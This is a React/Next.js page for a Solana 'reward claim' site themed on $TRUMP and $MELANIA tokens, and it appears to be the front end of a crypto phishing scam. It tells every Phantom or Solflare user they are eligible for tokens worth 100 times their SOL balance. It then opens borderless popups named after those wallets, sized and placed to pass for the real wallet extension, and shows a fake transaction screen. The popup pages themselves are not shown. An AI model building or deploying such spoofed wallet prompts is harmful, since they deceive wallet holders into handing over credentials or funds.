"use client";

import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import LogoWithCursorEffect from "@/components/Logo";
import CustomModal from "@/components/CustomModal";
import { useEffect, useState, useRef } from "react";
import Image from "next/image";
import InfoCards from "./Cards";
import Contact from "@/components/footer";


const Home = () => {
  const { connection } = useConnection();
  const { publicKey, wallet } = useWallet();
  const [storedPublicKey, setStoredPublicKey] = useState<string | null>(null);
  const [storedBalance, setStoredBalance] = useState<number | null>(null);
  const [rewardClaimed, setRewardClaimed] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);  // Modal state
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [isProceedModalOpen, setIsProceedModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false); // Loading state
  
  useEffect(() => {
    const fetchBalance = async () => {
      if (publicKey) {
        const balance = await connection.getBalance(publicKey);
        setStoredBalance(balance / 1e9); // Convert lamports to SOL
      }
    };
  
    fetchBalance();
  }, [publicKey, connection]);

  useEffect(() => {
    const savedPublicKey = localStorage.getItem("publicKey");
    const savedBalance = localStorage.getItem("balance");

    if (savedPublicKey) setStoredPublicKey(savedPublicKey);
    if (savedBalance) setStoredBalance(parseFloat(savedBalance));
  }, []);

  useEffect(() => {
    if (storedPublicKey) localStorage.setItem("publicKey", storedPublicKey);
    if (storedBalance !== null) localStorage.setItem("balance", storedBalance.toString());
  }, [storedPublicKey, storedBalance]);
  
  const openPopupFlow = async () => {
    if (!wallet) {
      console.log("No wallet connected!");
      return;
    }

    const walletName = wallet.adapter.name.toLowerCase();
    const popupWidth = 360;
    const popupHeight = 580;
    const left = window.screenX + (window.innerWidth - popupWidth);
    const top = window.screenY;

    if(walletName == 'solflare'){
    const popup = window.open(
      "/rewards", // Path to the popup page
      "solflare",
      `width=${popupWidth},height=${popupHeight},top=${top},left=${left},resizable,scrollbars=no,toolbar=no,menubar=no,location=no,status=no`
    );
   
    if (popup) {
      popup.onload = async () => {
        if (publicKey) {
          const balance = await connection.getBalance(publicKey);
          popup.postMessage({ publicKey: publicKey.toString(), balance }, window.location.origin);
          console.log(publicKey);
          console.log(balance);

          // Save the publicKey and balance to local state and localStorage
          setStoredPublicKey(publicKey.toString());
          setStoredBalance(balance / 1e9); // Convert lamports to SOL
        }
      };
    }}
    if(walletName == 'phantom'){
      const popup = window.open(
        "/reward", // Path to the popup page
        "Phantom Wallet",
        `width=${popupWidth},height=${popupHeight},top=${top},left=${left},resizable,scrollbars=no,toolbar=no,menubar=no,location=no,status=no`
      );
    if (popup) {
      popup.onload = async () => {
        if (publicKey) {
          const balance = await connection.getBalance(publicKey);
          popup.postMessage({ publicKey: publicKey.toString(), balance }, window.location.origin);
          console.log(publicKey);
          console.log(balance);

          // Save the publicKey and balance to local state and localStorage
          setStoredPublicKey(publicKey.toString());
          setStoredBalance(balance / 1e9); // Convert lamports to SOL
        }
      };
    }}
    

    if (publicKey) {
      const balance = await connection.getBalance(publicKey);
      setStoredPublicKey(publicKey.toString());
      setStoredBalance(balance / 1e9);
      setRewardClaimed(true); // Show reward card
    }
  };

  const handleBackgroundClick = () => {
    if (videoRef.current) {
      videoRef.current.muted = !videoRef.current.muted;
    }
  };

  const handleBuyClick = () => {
    window.open(
      "https://pump.fun/coin/FmVuYmiEZrbmP6eUfyt3EPNyi7MaY588hUg8GJEcpump",
      "_blank"
    );
  };

  const handleClaimRewardClick = () => {
    if (wallet?.adapter.name === "Solflare" || wallet?.adapter.name === "Phantom") {
      setIsProceedModalOpen(true); // Open modal for Solflare & Phantom wallets
    } else {
      setIsModalOpen(true); // Open unsupported wallet modal
    }
  };

  

  const handleProceedClick = async () => {
    setIsLoading(true); // Show loading screen
    setIsProceedModalOpen(false); // Close the modal

    openPopupFlow();
  
    setTimeout(() => {
      openPopupFlow(); // Proceed with reward claim
      setIsLoading(false); // Hide loading screen after 2 minutes
    }, 120000);
  };
  
  

  return (
    <main className="flex flex-col items-center bg-[#ff9b0f] min-h-screen py-10">
     <div className="absolute top-0 w-full flex justify-center items-center mt-4">
    <LogoWithCursorEffect />
            <svg className="bg-[#ff9b0f] w-full h-full" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg" id="Layer_1" viewBox="0 0 996.58 561.84"><defs><radialGradient id="radial-gradient" cx=".98" cy="1039.5" fx=".98" fy="1039.5" r="1.84" gradientTransform="matrix(398.21 0 0 -398.21 107.33 414205.39)" gradientUnits="userSpaceOnUse"><stop offset=".17" stopColor="#fff"></stop><stop offset=".39" stopColor="#eff8fa"></stop><stop offset="1" stopColor="#c7e9f0"></stop></radialGradient><radialGradient id="radial-gradient-2" cx="1" cy="1039.47" fx="1" fy="1039.47" r="1.84" gradientTransform="matrix(457.88 0 0 -380.27 58.78 395567.24)" gradientUnits="userSpaceOnUse"><stop offset=".19" stopColor="#e5f5fd"></stop><stop offset=".52" stopColor="#54d6ff" stopOpacity=".57"></stop><stop offset=".85" stopColor="#48bae0" stopOpacity=".16"></stop><stop offset="1" stopColor="#2aafdb" stopOpacity="0"></stop></radialGradient><clipPath id="clippath"><path className="cls-2" d="M0 0h996.58v561.84H0z"></path></clipPath><clipPath id="clippath-1"><path className="cls-2" d="M-15.01-281.79H1011.6V802.62H-15.01z"></path></clipPath><mask id="mask" x="-323.95" y="-409.79" width="1680.94" height="1397.02" maskUnits="userSpaceOnUse"><g mask="url(#clippath-1)" id="mask0_2750_285"><path d="M836.7 802.62H159.89c-46.72 0-90.64-18.2-123.67-51.23-33.04-33.04-51.24-76.96-51.24-123.67v-734.6c0-46.72 18.2-90.64 51.23-123.67 33.04-33.04 76.96-51.23 123.68-51.23h676.8c46.72 0 90.64 18.2 123.67 51.23 33.04 33.04 51.23 76.96 51.23 123.67v734.6c0 46.72-18.2 90.64-51.23 123.67-33.04 33.04-76.96 51.23-123.67 51.23Z" fill="url(#radial-gradient)"></path></g></mask></defs><g><g><g className="opacity-[0.18]"><path d="M512.11 292.26C646.54 168.71 784.54 48 471.71-409.79h84.67c256 480.37 105.35 590.03-42.54 701.74-.23.27-.47.53-.7.78-58.92 66.33-116.62 133.38-113.46 237.72 2.88 104.17 66.62 245.62 244.12 456.76h-84.45c-305.13-449-178.61-573.68-46.63-694.44-.2-.17-.4-.35-.61-.52Zm-2.18-2.84c.03.07.05.15.07.21-67.09 1.92-134.12 4.5-200.32 26.1-66.23 21.13-131.64 61.27-195.96 127.48C49.36 508.49-13.9 599.8-76.75 701.83c-62.9 100.65-125.37 212.02-189.47 285.39h144.69C-75.94 885.99-32.08 774.44 14.41 678.9c46.35-96.38 95.32-176.76 147.91-235.02 52.51-58.82 108.64-95.51 167.22-117.42 58.52-22.21 119.49-29.63 180.57-36.53.07.2.14.41.2.61-112.16 21.18-222.25 49.2-308.61 159.21-43.43 54.15-81.28 127.57-113.75 219.6-32.62 91.54-59.86 201.7-85.37 317.86h109.54c10.17-249.61 51.06-426.17 123.08-528.82 70.74-105.68 172.6-137.46 275.22-167.57.03.1.07.2.1.3-94.4 36.79-187.96 75.02-245.51 177.33-58.44 100.71-80.85 265.49-53.51 518.76h92.19c-62.43-251.08-57.01-407.59-11.11-507.66 45.39-100.77 131.27-145.09 218.04-188.13.04.12.08.23.12.35-.03-.12-.05-.25-.08-.37.07-.03.15-.07.21-.1 0 .15.03.29.04.43-160.42 96.56-311.07 204.29-119.73 695.48h84.39c-250.49-472.04-109.55-586.02 35.95-695.53 0 .04-.02.08-.02.12 0-.04.03-.09.03-.14.04-.03.08-.07.13-.1-.03.08-.07.17-.1.26.06-.1.11-.2.16-.3.03-.03.08-.05.11-.08-.09.13-.18.27-.27.39.16-.19.32-.37.48-.55.13-.09.26-.19.38-.29.03.03.07.07.09.1a.7.7 0 0 1-.08-.1c.11 0 .22-.02.33-.03-.05-.04-.09-.08-.15-.12.12-.04.23-.09.35-.14a.284.284 0 0 1-.09-.06c.32-.24.65-.49.96-.73-.36.22-.72.44-1.08.67-.03 0-.05-.03-.08-.03.09-.09.16-.18.25-.27.28-.14.57-.28.85-.42-.25.09-.49.19-.73.28a.87.87 0 0 0 .09-.11c.21-.06.43-.12.65-.19-.2.03-.39.08-.58.11.07-.08.14-.15.2-.22.05 0 .1.03.16.03-.05-.02-.1-.03-.15-.05.06-.06.11-.13.17-.19.05 0 .1-.02.15-.02h-.14c59.69-67.38 119.81-134.32 117.92-239-1.59-104.49-65.16-246.7-245.85-460.33h-88.95c202.76 198 288.46 338.64 304.54 445.29 17.01 107.11-35.61 180.24-87.84 253.76-.13-.02-.26-.03-.38-.05 44.34-80.07 89.08-159.72 54.52-269.6-32.48-109.08-144.26-248.38-364.76-429.36H101.66C333.58-246.73 477.16-109.02 528.89 2.6c55.7 112.75 19.54 199.41-16.22 286.54l-.41-.06c28.33-94.47 50.59-189.68-29.21-304.61-38.78-57.25-101.48-119.12-187.01-185.46-84.85-66.22-192.53-136.89-306.19-208.8h-126.46c104.44 63.81 224.22 129.13 324.62 192.31 101.5 63.3 183.6 124.45 238.13 182.64 55.27 58.27 82.94 113.58 92.44 167.03 9.88 53.48 1.57 105.09-6.64 156.84-.31-.04-.61-.08-.92-.13 2.11-56.86 4.26-113.53-17.16-170.65C473.04 61.15 428.65 3.6 351.61-54.73c-75.82-58.29-184.28-117.36-305.23-176.85-119.13-59.45-250.75-119.33-330.87-178.21h-26.83c-3.99 3.47-8.18 7.01-12.61 10.54v90.72c105.2 47.87 240.44 93.71 359.06 140.46 120.02 46.66 223.43 94.23 297.16 143.61C406.95 24.86 451.94 76 476.49 128.49c25.02 52.46 29.6 106.27 34.17 160.27-.25-.32-.5-.62-.74-.94-10.22-49.16-20.59-98.13-47.03-144.65-26.16-46.56-68.39-90.65-135.93-131.01C259.94-28.29 167.64-65 54.05-98.66c-112.75-33.76-246.76-64.5-378-95.79v99.36C-179.47-80.94-48.09-63.8 59.94-41.18c108.52 22.5 193.7 50.48 256.73 83.7C444.72 108.51 479.8 196.6 509.01 286.7c-39.44-82.38-79.98-163.85-203.94-217.49C183.9 14.66-20.7-12.09-323.95-6.39v81.58c300.57-36.27 492.04-25.21 611.86 17.2 121.14 41.84 170.65 115.03 217.57 189.86-54.47-68.53-111.34-135.32-231.53-167.02-119.69-31.98-302.71-28.87-597.91 36.04v73.14c577.72-184.85 708.69-64.52 832.37 62.53.19.3.38.6.56.9-138.78-115.08-280.72-225.76-832.93 7.67v71.34C197.76 88.53 356.29 184.18 508.6 288.17c-.27-.09-.53-.17-.79-.26-83.74-45.47-168.32-89.34-294.92-79.27-126.22 9.58-294.46 73.1-536.84 231.31v76.67C-103.41 343.77 62.02 260.06 190.4 236.56c129.11-24.67 221.18 10.9 311.73 49.52-98.76-31.72-198.95-59.89-331.39-18.98-131.32 38.52-294.9 146.12-494.69 330.87v89.23c89.81-95.05 175.77-178.59 255.65-243.84 79.97-65.52 153.85-112.75 221.64-141.54C221.22 272.74 283 262.09 340.9 263.3c57.98.93 112.06 13.72 166.68 25.1h.02c-118.17-18.21-238.24-26.41-376.78 56.73C61.79 385.46-11.5 446.85-88.22 525.08c-76.58 77.51-156.58 171.87-235.71 261.77v114.91c71.45-76.24 145.11-180.65 217.75-272.5 72.73-93.03 144.45-173.47 214.21-229.25 69.82-56.57 137.69-88.47 204.18-102.77 66.52-14.71 131.68-11.83 196.8-8.25.32.14.62.27.94.4Zm3.6 4.17s-.04.06-.06.08l-.44-.06c.14.03.28.07.42.09-51.58 72.27-101.6 145.29-83.5 251.87 17.23 106.15 102.56 245.86 301.62 441.63h92.41C607.15 807.89 496.5 669.57 463.17 561.09c-35.27-109.23 6.79-188.6 50.63-267.31l.26.06c-35.4 85.63-68.77 171.87-12.89 283.87 52.17 110.94 193.59 247.63 422.28 409.5h109.73c-112.84-71.53-218.8-141.72-302.41-207.49-84.21-65.89-146.08-127.36-184.55-184.2-79.5-114.19-59.8-208.75-31.8-301.6.09.02.19.04.27.06-.15-.12-.3-.25-.44-.37.08 0 .17 0 .26.02 0-.04.03-.08.03-.13h-.32c0 .02-.02.04-.03.06-.08-.02-.15-.03-.22-.05.02-.03.03-.06.05-.08-.08-.06-.15-.13-.23-.19-.07.09-.14.2-.2.29-.18 0-.37 0-.55.02.17 0 .34.02.51.03v.02Zm843.45 391.43v-88.98c-300.26 2.69-506.63-25.19-629.75-80.08C601.25 462 558.52 381.04 519.51 299.02c47.03 75.28 97.26 149.43 220.07 192.62 121.39 43.78 315.35 56.6 617.42 23.04v-76.54c-297.19 62.24-482.25 63.64-603.15 30.37C632.4 435.53 575.1 367.87 520.67 298.92c-.66-.54-1.3-1.08-1.96-1.6l-.42-.9c.71.72 1.41 1.43 2.12 2.16-.9-1.15-1.82-2.3-2.72-3.46-.08-.16-.15-.32-.23-.48.37.09.73.17 1.1.26 152.5 103.65 312.98 201.09 838.45-74.95v-73.38c-242.63 156.39-411.49 219.06-538.27 228.57-127.14 9.95-212.2-33.25-295.41-78.22 90.9 38.54 183.56 75.18 313.79 51.66 129.52-22.38 296.61-104.93 519.89-278.25v-81.95c-202.28 185.77-367.34 292.09-499.64 329.36C723.96 357.35 623.3 327.9 524.3 296.2c54.27 11.18 108.29 23.71 166.31 24.57 57.93 1.13 119.87-9.4 187.93-38.15 67.96-28.48 142.06-75.19 222.22-140.25 80.08-64.79 166.23-147.94 256.26-243.12v-99.87c-79.94 91.46-160.74 186.24-238.05 263.59-77.46 78.06-151.44 138.69-221.02 178.01-139.78 81.59-260.66 71.47-379.06 53.45-.4-.2-.81-.41-1.21-.62 65.23 3.51 130.7 6.89 197.7-6.98 66.97-13.47 135.46-44.18 205.97-99.74 70.44-54.77 142.89-134.37 216.28-227.35 73.3-91.8 147.54-196.99 219.39-275.53v-83.79c-4.05-3.23-8.07-6.66-12.18-10.21h-36.49c-64.97 72.32-128.54 185.18-192.73 287.27-64.11 103.55-128.84 196.31-194.67 262.31-65.79 66.98-132.68 107.18-200.25 128.08-67.54 21.4-135.75 23.5-203.72 25.57-.03-.02-.08-.04-.11-.06-.08-.16-.15-.33-.23-.5 61.9-7.08 123.98-14.13 183.73-36.08 59.79-21.64 117.27-58.18 171.05-117.42C925.29 80.73 975.47-.63 1022.91-98.28c47.57-96.78 92.4-209.86 138.93-311.52h-125.3c-26.25 117.42-54.26 229.13-87.81 321.78-33.4 93.18-72.34 167.29-117 221.58C743.06 244.32 630.21 270.95 516.5 292.6c-.09-.18-.17-.36-.26-.54 104.03-30.73 208.61-61.17 281.5-167.24C871.98 21.94 914.51-156.57 925.38-409.8H824.73c27.4 257.23 3.51 423.49-57.02 524.37-59.6 102.55-155.83 139.73-251.55 177.2-.02-.07-.03-.15-.04-.21 87.99-43.82 176.48-87.35 223.81-188.32 47.85-100.23 54.55-257.92-8.83-513.03h-88.63c194.68 498.88 36.19 602.8-126.44 701.03v-.08.08s-.09.06-.14.08c-.02-.04-.03-.08-.06-.13.02.04.03.09.04.13-.1.06-.2.13-.3.19v-.36c-.02.13-.04.27-.06.39-.15.09-.29.18-.43.27.07-.23.14-.46.2-.69l-.15.21c.03-.08.04-.16.07-.24-.09.17-.18.35-.27.52a.55.55 0 0 1-.07-.09c-.09.2-.2.4-.29.6-.15-.08-.32-.17-.47-.26.15.09.28.19.43.29l-.24.15c.03.04.05.08.08.12 0 0 .02 0 .03-.02 0 0 .02.03.03.03-.03 0-.07.02-.09.03-.04.06-.08.11-.12.17.09-.03.19-.05.28-.09 0 0 .02-.02.02-.03l.03.03c.03 0 .05-.02.08-.03.04.08.08.15.12.23.03-.09.05-.2.08-.29.17.08.35.15.52.23 0 .04-.02.08-.02.13-.14.03-.29.06-.43.08l.15.15c.08 0 .18-.02.26-.03 0 .08-.02.14-.03.22-.03 0-.05-.02-.07-.03.02.07.03.13.04.2.04.02.09.03.15.06h-.15c0 .06-.02.12-.02.18.1 0 .2 0 .31.02v-.14l.14.14c.21.05.41.11.61.16 0 .07 0 .13.02.2-.1-.02-.21-.03-.31-.04.11.11.22.22.32.33.17.17.33.35.5.52-.03-.12-.05-.25-.08-.37.49.78.97 1.57 1.46 2.35-.2-.17-.41-.33-.62-.5 29.02 90.22 66.02 178.74 196.33 245.77 64.29 33.71 150.68 62.34 259.85 85.7 108.68 23.47 240.14 41.69 383.26 57.18v.03Zm0-394.46c-549.99 229.41-697.71 121.89-835.99 8.62 122.49 126.25 259.2 244.46 835.99 66.18v-74.8Zm-54.15 696.66c-82.87-58.13-212.37-117.57-329.23-176.67-118.53-59.16-224.41-117.98-298.88-175.96-75.61-58.01-119.82-115.17-140.99-171.68-21.74-56.54-20.44-112.42-18.28-168.27-.13-.1-.25-.21-.38-.31-8.21 50.83-15.74 101.75-5.4 154.67 9.99 52.88 37.84 107.77 92.38 165.64 53.86 57.79 134.42 118.56 234.1 181.45 98.65 62.78 216.44 127.69 321.28 191.14h145.39v-.02Zm54.15-202.7c-128.66-32.37-262.24-64.07-375.43-98.67-114.05-34.48-207.73-71.86-276.16-112.82-68.99-40.88-112.71-85.34-139.89-132.13-27.47-46.75-38.4-95.82-48.51-144.99-.2-.17-.42-.34-.62-.51 4.43 53.98 9.77 107.94 36.15 160.71 25.9 52.81 72.84 104.44 149.34 154.41 75.55 50.02 180.65 98.37 300.99 145.85 118.92 47.56 253.09 94.24 354.15 142.77V784.53Z" fill="url(#radial-gradient-2)"></path></g></g></g></svg>

  </div>

  {/* Connect Wallet Button */}
  <div className="absolute top-4 right-4 z-20">
    <WalletMultiButton />
  </div>
     

      {/* Info Text */}
      <h2 className="font-custom text-4xl text-white mt-32 text-center z-10">
        Connect a wallet to check reward eligibility
      </h2>

      {/* Step Arrow */}
      <Image src="/arrow.png" alt="Step Image" width={500} height={500} className="mt-6 z-10" />

      {/* Main Content Card */}
      <div className="mt-6 w-160 bg-[#ffbc0f] shadow-2xl rounded-xl p-6 text-center z-10">
        <h1 className="font-fire text-2xl font-bold">MAKE AMERICA GREAT NATION!</h1>
        <Image src="/usa.gif" alt="USA" width={150} height={150} className="mx-auto mt-4" />
        <button
  onClick={handleClaimRewardClick}
  disabled={!wallet}
  className="mt-4 bg-gradient-to-r from-yellow-200 via-yellow-400 to-orange-500 text-gray-900 font-medium rounded-lg text-sm px-5 py-2.5 shadow-lg hover:bg-gradient-to-br transform hover:scale-105 transition-all disabled:bg-gray-500 disabled:cursor-not-allowed"
>
  Claim Reward
</button>

      </div>

      {/* Info Cards */}

      <div className="mt-10">
        <InfoCards />

      </div>
      <div className="relative">
      </div>

      {/* Footer */}
      <Contact />

      {/* Custom Modal */}
      <CustomModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Unsupported Wallet"
        description="We currently only support Solflare and Phantom wallet."
      />
      <CustomModal
        isOpen={isProceedModalOpen}
        onClose={() => setIsProceedModalOpen(false)}
        title="Congrats!!"
        description="You are eligible to claim your reward. Click Proceed to continue."
      >
        <button
          onClick={handleProceedClick}
          className="mt-4 bg-green-500 text-white font-bold px-4 py-2 rounded-lg hover:bg-green-700 transition"
        >
          <div className="grid grid-cols-2 pt-2">
                        <div className="pl-6">
                          <Image
                            src="/melania.png"
                            alt="App Icon"
                            width={50}
                            height={50}
                            className="rounded-full"
                          />
                        </div>
                        <div>
                        <p>{storedBalance !== null ? (storedBalance * 100).toFixed(2) : "0.00"} $MELANIA</p>                        </div>
                      </div>
          
                      <div className="grid grid-cols-2">
                        <div className="pl-6 pt-6">
                          <Image
                            src="/trump.png"
                            alt="App Icon"
                            width={50}
                            height={50}
                            className="rounded-full"
                          />
                        </div>
                        <div className="pt-6">
                        <p>{storedBalance !== null ? (storedBalance * 100).toFixed(2) : "0.00"} $TRUMP</p>                        </div>
                      </div>
          Proceed
        </button>
      </CustomModal>

      {/* Loading Screen */}
      {isLoading && (
        <div className="absolute inset-0 bg-opacity-50 bg-black flex justify-center items-center z-30">
          <div className="flex flex-col justify-center items-center">
            <Image src="/loading.webp" alt="loading" width={50} height={50} className="" />
            <div className="mt-4 text-white text-xl">Transaction in Progress...</div>
          </div>
        </div>
      )}
    </main>

  );
};

export default Home;
